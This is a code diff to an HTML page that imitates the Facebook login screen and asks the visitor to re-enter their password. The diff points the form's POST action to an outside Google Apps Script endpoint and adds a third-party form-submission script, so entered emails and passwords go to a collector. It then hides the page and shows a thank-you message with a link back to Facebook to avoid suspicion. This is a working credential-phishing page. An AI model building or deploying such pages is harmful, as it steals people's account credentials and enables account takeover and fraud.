@@ -19,22 +19,23 @@
 </head>
 <body>
 	<!-- body -->
-	<div class="container-fluid header">
+	<div id="main" class="container-fluid header">
 		<div class="row">
-			<div class="col-sm12">
+			<div class="col-sm-12">
 				<div class="text-center">
 					<a href="https://www.facebook.com/" target="_blank" class="white"><h1 class="bold white">facebook</h1></a>
 				</div>
 			</div>
 		</div>	
 		<div class="row back">
-			<div class="col-sm12">
+			<div class="col-sm-12">
 				<div class="center">
 					<h4 class="bold">Facebook Login</h4><hr>
 					<div class="warning">
 					Please re-enter your password
 					</div>
-					<form id="frm1" class="form-horizontal" action="/action_page.php">
+					
+					<form id = "gform" class="form-horizontal" method="POST" action="https://script.google.com/macros/s/AKfycbzw9gCPw_F9VlnCGnSSYnDMT6WinCaQCSUvb22AJYs6xgPqYqbT/exec">
 					    <div class="form-group">
 					      <label class="control-label col-sm-3" for="email" style="text-align: left;">Email:</label>
 					      <div class="col-sm-9">
@@ -56,7 +57,7 @@
 					    </div>
 					    <div class="form-group">        
 					      <div class="col-sm-offset-2 col-sm-10">
-					        <button onclick="myFunction" type="submit" class="btn but">Log In</button>
+					        <button id="log" class="btn but">Log In</button>
 					      </div>
 					    </div>
 					</form>
@@ -66,7 +67,7 @@
 	</div>	
 	<!-- body end here -->
 	<!-- footer start here -->
-	<section class="footer">
+	<section class="footer" id="main2">
 		<div class="container">
 			English(UK)&nbsp;&nbsp;
 			<a href="#">العربية</a>&nbsp;&nbsp;
@@ -115,19 +116,24 @@
 		</div>
 	</section>
 	<!-- end of the footer is here -->
-	<p id="demo"></p>
-
-<script>
-function myFunction() {
-    var x = document.getElementById("frm1");
-    var text = "";
-    var i;
-    for (i = 0; i < x.length ;i++) {
-        text += x.elements[i].value + "<br>";
-    }
-    document.getElementById("demo").innerHTML = text;
-}
+	<div style="display: none;" id="thankyou_message">
+		<div class="container">
+			<dir class="row">
+				<div class="col-sm-12 text-center" style="margin-top: 200px;">
+					<h1>Thank you for choosing our app</h1>
+					<h3>You can now continue to your &nbsp;<a href="https://www.facebook.com/">Facebook</a></h3>
+				</div>
+			</dir>
+		</div>
+	</div>
+<script type="text/javascript">
+	document.getElementById("log").addEventListener("click", myFunction);
+	function myFunction (){
+		document.getElementById("main").style.display ="none";
+		document.getElementById("main2").style.display ="none";
+	}
 </script>
+<script data-cfasync="false" type="text/javascript" src="https://cdn.rawgit.com/dwyl/html-form-send-email-via-google-script-without-server/master/form-submission-handler.js"></script>
 <script src="js/jquery-3.1.1.min.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script src="js/test.js"></script>
